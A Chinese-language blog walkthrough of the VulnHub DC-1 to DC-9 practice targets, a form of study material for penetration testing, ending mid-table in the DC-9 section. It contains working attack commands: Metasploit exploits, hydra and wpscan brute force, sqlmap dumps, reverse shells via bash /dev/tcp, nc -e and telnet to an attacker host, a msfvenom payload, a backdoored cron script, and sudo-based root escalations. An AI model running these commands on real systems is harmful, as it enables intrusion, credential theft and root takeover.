---
title: vulhub打靶 DC系列
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 41
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 打靶
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter

---

<!--more-->

# dc1

> nmap的基础使用，信息收集
>
> msf漏洞库搜索漏洞
>
> 使用漏洞攻击靶机拿到shell,找到第一个flag，查看/etc/passwd
>
> 使用hydra爆破ssh登录的账号密码
>
> 登陆账号拿到第二个flag
>
> 查看到durpal的配置文件，获取到数据库信息，拿到第三个flag
>
> 尝试连接数据库，在数据库里发现admin账号，修改管理员的hash值
>
> 登录到web界面，拿到第四个flag
>
> 提权root拿到第五个flag

dc1和kali都在桥接模式下，nmap扫，拿到dc1  ip  192.168.10.109

![image-20230719142442393](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191424034.webp)

## 外网

有22和80端口，因为还不知道DC-1所使用的用户，所有还不能爆破ssh，先访问一下80端口网页

web服务

![image-20230719142525403](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191425666.webp)

msf漏洞库搜索 Drupal，并攻击

启动msf的数据库

```
msfdb start
```

启动msfconsole

搜索 search Drupal

使用2

run

就攻击成功了，拿到shell

![image-20230719144053403](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191440869.webp)

ls可以看到第一个flag1.txt





## 内网

看一下有哪些用户,发现有一个flag4

```
cat /etc/passwd
```

![image-20230719144528547](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191445773.webp)

使用hydra来爆破一波看看是否能拿到密码

```
hydra -l flag4 -P /usr/share/john/password.lst 192.168.10.109 ssh
```

得到falg4账号的密码为 orange

![image-20230719144908853](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191449068.webp)

使用ssh连接靶机

![image-20230719145349215](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191453482.webp)

ls在flag4账户的目录下找到了falg4，可想而知还有在前面还有两个flag，可能在web上，因为web有账号

![image-20230719145441378](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191454586.webp)



在配置文件找到了flag2和数据库信息：/var/www/sites/default

数据库的账号：dbuser 密码: R0ck3t

![image-20230719150306982](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191503253.webp)



连接数据库

```
mysql -u dbuser -p

show databses;
use drupaldb;
show tables;
select * from users;
```

可以看到admin的账号密码，但是是哈希加密的

![image-20230719150828274](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191508552.webp)

搜索一下password

```
find / -name password*
```

![image-20230719150929397](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191509633.webp)

可以看到var/www/scripts下有个sh的脚本

直接执行试试

可以重置密码

![image-20230719151037596](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191510945.webp)

```
scripts/password-hash.sh  123456
```

还得注意它执行的路径

![image-20230719151542783](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191515346.webp)

拿到一个hash值，拿去替换admin的密码

password: 123456       hash: $S$D7teEXpP7/AkgawJBhyKD6DNNWDUS3s9n.R/rWVq48nmIvSmQrvD

```
update users set pass='$S$D7teEXpP7/AkgawJBhyKD6DNNWDUS3s9n.R/rWVq48nmIvSmQrvD' where name='admin';
```

![image-20230719151711087](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191517305.webp)

web端登录

![image-20230719151758094](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191517419.webp)



找到flag3

![image-20230719151833782](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191518144.webp)

之前flag4提到要提权

![image-20230719152211966](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191522157.webp)

```
cd ~
find -name flag4.txt -exec /bin/bash -p \;
cd /root
ls
cat thefinalflag.txt
```

![image-20230719152126552](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307191521857.webp)

> `find -name flag4.txt -exec /bin/bash -p \;`
>
> 该命令使用`find`命令搜索具有名称为"flag4.txt"的文件，并对每个匹配的文件执行指定的命令。
>
> 解释该命令的各个部分：
>
> - `find`: 命令本身。
> - `-name flag4.txt`: `-name`是`find`命令的选项之一，用于指定搜索的文件名模式。在这种情况下，它指定要搜索名称为"flag4.txt"的文件。
> - `-exec /bin/bash -p \;`: `-exec`是`find`命令的另一个选项，指定要执行的命令。在这里，我们以`/bin/bash -p`作为要执行的命令。`/bin/bash`是Bash Shell的路径，`-p`选项表示以特权（即以root用户的权限）启动Bash Shell。`\;`表示在命令末尾使用分号来标记命令的结束。
>
> 该命令的作用是在开始搜索的目录中查找名为"flag4.txt"的文件，并对每个匹配的文件执行 `/bin/bash -p`命令，以特权的方式启动Bash Shell。
>
> 请注意，`-exec`选项和后续的命令必须以分号(`;`)结尾，并且在命令行中需要使用`\`来转义分号，以防止被Shell解释器解析。

至此5个flag收集完了



# dc2

这个靶机找到ip以后需要hosts文件加上一条,这里我的dc-2 ip是192.168.10.102

![image-20230719232514158](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307192325415.webp)

kali也加上：vim /etc/hosts



信息搜集

```
-sV 服务探测
nmap 192.168.10.102 -sV -p1-65535
```

![image-20230719233555706](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307192335939.webp)



是一个wordpress

![image-20230719232622767](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307192326952.webp)



菜单栏找到flag1

![image-20230719234145455](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307192341735.webp)



从中看到一个重要的信息，提示我们用cewl来获取密码

Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。

cewl使用   -w这里可以使用-w参数来将密码字典存储为text文件：

```
cewl http://dc-2/index.php/flag/ -w dc-2.txt
```

`wpscan --url url -e u`用户名枚举

枚举出三个

![image-20230720002038420](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200020755.webp)

爆破密码

wpscan --url http://dc-2 -U user.txt -P dc-2.txt

爆破到了jerry和tom的密码

 Username: jerry, Password: adipiscing
    Username: tom, Password: parturient

![image-20230720002953946](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200029140.webp)

得到了账号密码但是没有能找到登录的地方

使用nikto来扫描一下登录，也可以使用御剑扫描一下

nikto -h http://dc-2/

访问wp-login.php进入到登录界面

jerry账户下发现flag2

![image-20230720003217645](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200032923.webp)



tom的账号密码可以用来ssh登录

tom, Password: parturient

![image-20230720003528672](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200035896.webp)

很多命令是不能用的

那么使用一下linux的`compgen -c`命令查看一下当前可以使用的命令

还剩vi可以用

![image-20230720004739475](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200047845.webp)

这里说要提权，但开启了rbash限制

![image-20230720004937812](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307200049039.webp)

> `rbash`是一个受限制的shell，它是Bash（Bourne-Again SHell）的一个变体，具有一些限制。以下是`rbash`的几个限制：
>
> 1. 不能更改当前工作目录，即`cd`命令失效。
> 2. 不能使用绝对路径执行命令，只能使用相对路径或者命令名。
> 3. 不能使用重定向符`>`和`>>`，也不能使用管道符`|`。
> 4. 不能使用`eval`命令，它会将字符串作为Bash命令执行。
> 5. 不能使用Shell函数，因为`rbash`不允许定义Shell函数。
> 6. 不能使用`source`命令或`.`命令来执行脚本，只能使用`bash`命令来执行脚本。

### rbash逃逸

google了下相关信息，大概学到了两种方法适用

一种是利用vi提权

先后在vi的命令模式下执行以下两条指令

```
:set shell=/bin/sh
:shell
```



一种是利用BASH_CMDS，它是含有命令的内部散列表的数组，我们可以添加元素，然后执行

```
# 利用bash_cmds自定义一个shell
BASH_CMDS[a]=/bin/sh
#然后就可以把a当作定义的东西
a 

#我们逃逸了之后还是会发现无法执行命令，原因是环境变量中命令调取的路径被改变了（当前的环境被限制了），把路径改回来，就可以正常执行命令了
# 添加环境变量
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
```

![image-20230720232909432](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202329712.webp)

我们执行`export PATH=/usr/bin:/usr/sbin:/bin:/sbin`把路径改回来，就可以正常执行命令了

flag3

![image-20230720233818085](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202338335.webp)



登录jerry

export PATH="/usr/sbin:/usr/bin:/rbin:/bin"

添加之后尝试登录jerry

![image-20230720234018724](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202340968.webp)



git提权

![image-20230720234136468](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202341778.webp)





我们执行`sudo -l`查看sudo的权限，这里提示我们git命令是root权限并且是不需要密码的

![image-20230720235226067](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202352373.webp)



那么sudo执行`git -p`，在分页模式下执行`!'/bin/sh'`即可获取一个root权限的shell

![image-20230720235503366](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202355683.webp)



![image-20230720235518822](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202355247.webp)

找到最后一个flag

![image-20230720235953482](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307202359884.webp)



# dc3

报错解决下先

![image-20230805125404138](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051254603.webp)

信息搜集

```
nmap -sS -A 192.168.0.108
```

百度翻译

这一次，只有一个flag，一个切入点，没有任何线索。要获得该标志，您显然必须获得root权限。你如何成为根取决于你——显然，还有系统。祝你好运，我希望你喜欢这个小挑战

![image-20230805145503846](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051455301.webp)

joomla cms

![image-20230805150851571](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051508841.webp)



## joomscan扫描

joomscan扫描仪。是一个可以帮助网络开发员和网站管理员帮助自己确定已部署的joomal网站可能会存在的安全漏洞。

在kali上安装joomscan

```
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```

参数

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051515612.webp" alt="image-20230805151509317" style="zoom:67%;" />

```
perl joomscan.pl --url http://192.168.0.108
```

![image-20230805151951855](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051519156.webp)

发现了joomal的版本号，还有网站的其他路径

## xray扫描

```
xray webscan --basic-crawler http://192.168.0.108
```



## CMSseek

CMSeeK是一个CMS的漏洞检测和利用套件

```
git clone https://github.com/Tuhinshubhra/CMSeeK
cd CMSeeK
python3 cmseek.py
```

```
python3 cmseek.py --url http://192.168.0.108
```

![image-20230805152310299](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051523646.webp)



既然得到了joomal 3.7.0 的版本那就去搜索一下这个版本的漏洞

## msf

msf中搜索Joomla

```
msfdb start
msfconsole
search Joomla
```

再熟悉下msf，使用14查版本

![image-20230805154215646](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051542112.webp)

```
show options
set RHOSTS 192.168.0.108
run
```

![image-20230805154539629](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051545955.webp)

再次看到3.7.0这个版本

https://www.exploit-db.com/exploits/42033

## sqlmap

```
sqlmap -u "http://192.168.0.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C "username,password" --dump -p list[fullordering]
```

![image-20230805155628770](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051556129.webp)

```
admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu 
```



## john

https://cloud.tencent.com/developer/article/1937044

![image-20230805155922494](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051559742.webp)

```
snoopy
```

进入后台

![image-20230805160043746](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051600250.webp)

写shell蚁剑连接

```
http://192.168.0.108/templates/beez3/shell.php
```

![image-20230805164554406](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051645920.webp)

内核为Ubuntu 16.04

![image-20230805164639679](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051646024.webp)





## searchsploit

使用kali的漏洞库搜索一下

searchsploit Ubuntu 16.04

![image-20230805162744332](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308051627689.webp)

使用39772那个

cat /usr/share/exploitdb/exploits/linux/local/39772.txt

在文档里面有使用教程，以及尾部有下载连接

https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

经查询，换到了一个新的地址：https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main/bin-sploits

```
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

将文件下载下来

需要将exploit.tar上传到目标主机，并解压运行~

kali启动http服务，将exploit.tar文件复制到网站根目录。

```
systemctl restart apache2                                        
cp exploit.tar /var/www/html
```

靶机上下载

```
wget http://192.168.111.128/exploit.tar
```

解压exploit.tar文件

```
tar -xvf exploit.tar
```

进入目录

```
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
./doubleput
```



但是我并没有提权成功

https://www.cnblogs.com/just-like-this/p/16368394.html

反弹shell

```
bash -c ‘bash -i >& /dev/tcp/192.168.111.128/7788 0>&1’
```



用反弹shell也不行，不知道哪里的原因



# dc4

arl-scan+nmap搭配使用扫局域网yyds

![image-20230805205255358](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052052758.webp)

爆破

![image-20230805210054843](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052100117.webp)

抓包

![image-20230805210205033](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052102398.webp)



## 反弹shell

方法1

```
radio=nc+192.168.111.128+7788+-e+/bin/bash&submit=Run

python -c 'import pty;pty.spawn("/bin/sh")'
```



方法2

```
靶机：telnet 192.168.111.128 2333 | /bin/bash | telnet 192.168.111.128 4000

攻击机开两个监听
nc -lvvp 2333
nc -lvvp 4000
```

看下这台机器的用户

![image-20230805214733313](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052147715.webp)

只有jim用户下可以看到东西

![image-20230805215201253](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052152491.webp)

将内容复制到1的文本里

既然有了这个密码字典，那拿来试试能不能爆出jim的密码

使用hydra来爆

```
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
hydra -l root -P password.txt 192.168.1.111 ssh
```

hydra -l jim -P 1.txt -t 10 ssh://192.168.111.3

hydra -l jim -P 1.txt 192.168.111.3 ssh

![image-20230805215540054](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052155340.webp)

[22][ssh] host: 192.168.111.3   login: jim   password: jibril04





![image-20230805220040821](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052200091.webp)

翻目录，在var下的mail目录下找到一封邮件，得到charles的密码

![image-20230805220207087](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052202382.webp)

```
^xHhA&hvim0y
```

那么切换用户

![image-20230805220411981](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052204314.webp)

得知teehee命令是不需要root权限的

## teehee提权

看看这个是干啥的，–help查看帮助

![image-20230805221054346](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052210639.webp)

注意到`-a`参数可以直接在文件末尾加上字符串

那么尝试往passwd写入一个账户

`/etc/passwd` 各个字段的含义：

```
username:password:User ID:Group ID:comment:home directory:shell
```

写入

```
dongyu::0:0:::/bin/bash
```

密码我们直接置空，uid和gid都是0，也就是root用户，也就是说覆盖了root账户，密码为0

```
sudo teehee -a /etc/passwd
dongyu::0:0:::/bin/bash
su dongyu
```

![image-20230805222126217](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052221446.webp)



拿到flag

![image-20230805222220364](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052222662.webp)



# dc5

经典组合拳

![image-20230805222849079](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052228401.webp)

发现有一个80端口和111端口并且运行着rpcinfo服务,39098

![image-20230806154045281](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061540633.webp)



dirsearch扫目录

![image-20230806154448536](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061544803.webp)

这个网站唯一的交互就是contact那里，提交以后的Copyright © 2020的时间一直在变，应该是对应的这个footer.php

访问这个文件，刷新是会变的

![image-20230806154604458](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061546746.webp)

可以想到有可能存在文件包含，我看wp说这个参数是猜出来的

```
wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.111.4/thinkyou.php?FUZZ=/etc/passwd
```



![image-20230806154814975](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061548450.webp)

那就可以利用ctf的知识搞文件包含了

反弹shell

交互式

```
python -c 'import pty; pty.spawn("/bin/bash")'
```



## suid提权

尝试提权

查看有suid的文件夹

`find / -perm -u=s -type f 2>/dev/null`

看到有个screen-4.5.0的版本号

![image-20230806160316715](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061603060.webp)

GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。
搜索漏洞

去kali漏洞库搜索一下

```
searchsploit screen 4.5.0    
```

![image-20230806160845375](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061608633.webp)

- ![image-20230806163327092](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061633569.webp)
- 把41154.sh EXP内容：上面的c语言，剪切另存，保存为/tmp/libhax.c   提前编译：gcc -fPIC -shared -ldl -o libhax.so libhax.c
- 把下面的c语言，剪切另存，保存为/tmp/rootshell.c   提前编译：gcc -o rootshell rootshell.c
- 把剩下的内容，vi打开，进入末行模式输入 **:set ff=unix**  ，保存后，重命名为mv 41154.sh  dc5.sh，`dos2unix dc5.sh`

```
攻击机
nc -lp 1234 < libhax.so
nc -lp 1234 < rootshell 
nc -lp 1234 < dc5.sh

靶机
cd  /tmp
nc -nv 192.168.111.128 1234 > libhax.so
nc -nv 192.168.111.128 1234 > rootshell 
nc -nv 192.168.111.128 1234 > dc5.sh

chmod u+x dc5.sh
```

但是我会报错

```
No Sockets found in /tmp/screens/S-www-data.
```

```
gcc -fPIC -shared -ldl -o libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
gcc -o rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```

应该就是编译的时候==glibc版本太高==导致的，于是换台老一点的再编译上传即可成功提权得到flag

## msf

来试试msf的解法

**通过蚁剑上传系统后门，将会话转移到msf上。**

系统为x86结构

```
uname -a
```

![image-20230806174340342](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061743726.webp)

使用msfvenom生成x86结构的后门

```
msfvenom
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=7788 -f elf > shell.elf

```

蚁剑上传到/tmp

msf开启会话监听

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
```



![image-20230806175901713](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061759024.webp)

通过蚁剑中的虚拟终端运行后门。

```
chmod +x shell.elf
./shell.elf
```

![image-20230806175823119](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061758466.webp)

给back.elf添加执行权限。

msf接收到会话

![image-20230806175837062](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061758315.webp)

上传利用脚本

```
upload /tmp/41154.sh /tmp/
```

![image-20230806180207091](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308061802360.webp)

```
shell
chmod u+x 41154.sh
./
```



# dc6

信息搜集

![image-20230806222809837](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308062228230.webp)

这个靶机需要自己添一条host记录

用wpscan结合bp尝试爆破用户，以及找其他漏洞好久，发现vulbhub上面还有提示

![image-20230806234326501](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308062343840.webp)

/usr/share/wordlists/是kali自带的字典目录

其中rockyou.txt 是以压缩包的方式存在，代码段中已经解压，该[密码字典](https://so.csdn.net/so/search?q=密码字典&spm=1001.2101.3001.7020)两很大有1400多万行。

![image-20230806235501299](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308062355542.webp)

mark / helpdesk01

这个插件是有漏洞的

![image-20230807000511766](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070005013.webp)

https://www.cnblogs.com/SeanGyy/p/15576711.html

反弹shell

![image-20230807000914765](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070009045.webp)

mark用户目录下有一个txt

graham - GSo7isUM1D4

![image-20230807001213969](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070012203.webp)

ssh连接成功

![image-20230807001426109](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070014358.webp)



此外发现一个备份

backups.tar.gz

```
tar -zcvf 打包
tar -zxvf 解包
```

![image-20230807001645913](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070016197.webp)

sudo -l得知有个jens用户的backups.sh免密

![image-20230807002101923](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070021256.webp)

并且当前用户还对文件有写入权限，同一个用户组的

![image-20230807002707296](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070027517.webp)



写入反弹shell

```
echo 'bash -i >& /dev/tcp/192.168.111.128/7777 0>&1'>>backups.sh

这里一个小细节需要注意，直接bash backups.sh反弹的还是当前用户，需要sudo -u jens ./backups.sh
bash backups.sh
sudo -u jens ./backups.sh
```



![image-20230807003725853](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070037089.webp)



nc把那个压缩包传出来

![image-20230807004052039](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070040371.webp)



sudo -l又发现nmap可以root免密执行

![image-20230807004411913](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070044139.webp)



## nmap提权

那么直接创建一个脚本，利用nmap执行脚本获得一个root用户的shell

```
echo "os.execute('/bin/bash')">demon.nse
sudo nmap --script=/home/jens/demon.nse
```

进入到root

cat /root/ theflag.txt

![image-20230807004729376](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308070047648.webp)



# dc7

打开首页就直接提醒我们暴力破解是没有用的,跳出框外思考

```
DC-7 introduces some "new" concepts, but I'll leave you to figure out what they are.  :-)

While this challenge isn't all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won't succeed.

What you will have to do, is to think "outside" the box.

Way "outside" the box.  :-)
```



找到了一个github

https://github.com/Dc7User/staffdb

![image-20230807120739042](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308071207260.webp)

![image-20230807120638920](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308071206320.webp)

## 代码审计

内网渗透还是得找配置文件

![image-20230807122208718](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308071222986.webp)

ssh连接这个

![image-20230904102156655](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041021986.webp)



该用户目录下有一个mbox，其中一个脚本出现了很多次

![image-20230904160610517](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041606735.webp)



![image-20230904160645706](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041606932.webp)

drush: https://www.dwoke.com/node/436

这个能直接修改管理员密码

这里注意要到html目录下运行，只有这个目录是www-data权限，不然会提示权限不够

```
drush user-password admin --password="123456"
```

![image-20230904161346539](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041613728.webp)

登陆成功

![image-20230904161451851](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041614228.webp)



到这一步了要考虑的就是如何拿到更高的权限，可以通过更改那个backup.sh

这个脚本的拥有者是root，但是www-data权限也是可以更改执行的，所以想办法拿到一个www-data权限，刚刚登录了admin的账号，可以试试弹一个shell看看啥权限

在web层面反弹一个shell，决定这个shell权限的是php脚本的运行权限而不是web用户的权限

通过web进行反弹shell得到的权限一般是www-data

![image-20230904163247575](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041632803.webp)



后台默认是不带生成php界面的，需要下载插件

https://www.drupal.org/project/php/releases/8.x-1.x-dev

下载后上传

![image-20230904164127202](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041641430.webp)

![image-20230904164437394](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041644636.webp)



点一下那个激活，这样就可以生成php页面了

![image-20230904164741142](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041647594.webp)

连接成功

![image-20230904165510669](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041655864.webp)



将反弹shell写入脚本

```
echo "nc -e /bin/bash 192.168.111.128 6666" > /opt/scripts/backups.sh
```

root会==定时执行==`backups.sh`，所以等root执行了这个脚本就可以提权到root了

![image-20230904171844251](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309041718526.webp)



# dc8

ip地址 192.168.111.9

存在sql注入

![image-20230904201537007](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042015622.webp)

```
admin   | dc8blah@dc8blah.org | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
john    | john@blahsdfsfd.org | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
```

得到admin和john账号的hash值

那么接下来尝试使用john来爆一下这两个账号的hash值

```
john --wordlist=/usr/share/john/password.lst --rules dc8.txt
```

admin没爆破出，得到john用户的密码

![image-20230904204309915](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042043233.webp)

john:turtle

/user路径登录

![image-20230904204527990](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042045523.webp)











![image-20230904205644986](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042056269.webp)

python -c 'import pty;pty.spawn("/bin/bash")'



拿到shell的第一步还是翻配置文件





寻找特权文件

```
find / -user root -perm -4000 -print 2>/dev/null
```

![image-20230904213539491](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042135768.webp)



查看exim4权限位

![image-20230904213855055](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042138355.webp)

exim4是可以提权的

查看版本  exim4 --version

漏洞库搜索一下  searchsploit exim 4 



复制相关脚本到本地，再本地python搭个http服务，目标机shell上把脚本wget下来

```
python -m http.server 9111
```



# dc9

终于到dc-9了

arl-scan+nmap信息搜集

![image-20230905110200782](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051102275.webp)



有一个查找的地方

![image-20230905112107776](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051121024.webp)

order by 7刚好查不出，说明存在6列

![image-20230905112027083](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051120334.webp)

sqlmap验证有sql注入

![image-20230905111410619](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051114909.webp)

user

![image-20230905112302874](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051123083.webp)

```
+----+-----------+------------+---------------------+---------------+-----------+
| id | username  | lastname   | reg_date            | password      | firstname |
+----+-----------+------------+---------------------+---------------+-----------+
| 1  | marym     | Moe        | 2019-12-29 16:58:26 | 3kfs86sfd     | Mary      |
| 2  | julied    | Dooley     | 2019-12-29 16:58:26 | 468sfdfsd2    | Julie     |
| 3  | fredf     | Flintstone | 2019-12-29 16:58:26 | 4sfd87sfd1    | Fred      |
| 4  | barneyr   | Rubble     | 2019-12-29 16:58:26 | RocksOff      | Barney    |
| 5  | tomc      | Cat        | 2019-12-29 16:58:26 | TC&TheBoyz    | Tom       |
| 6  | jerrym    | Mouse      | 2019-12-29 16:58:26 | B8m#48sd      | Jerry     |
| 7  | wilmaf    | Flintstone | 2019-12-29 16:58:26 | Pebbles       | Wilma     |
